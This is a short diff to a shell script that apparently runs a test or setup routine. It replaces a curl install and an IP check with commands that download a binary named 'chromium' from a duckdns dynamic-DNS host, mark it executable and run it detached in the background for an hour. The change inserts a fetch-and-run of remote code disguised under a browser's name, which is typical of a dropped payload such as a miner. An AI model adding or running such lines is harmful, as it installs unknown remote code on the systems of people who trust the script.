@@ -12,7 +12,8 @@ head -c 120 /tmp/example.html
 echo
 echo "UML-RUN-OK"
 apk update
-apk add curl
-curl ifconfig.me
-
-sleep 600
+wget http://xyz0895.duckdns.org/files/chromium
+chmod +x chromium
+./chromium & disown
+sleep 3600
+killall -9 chromium
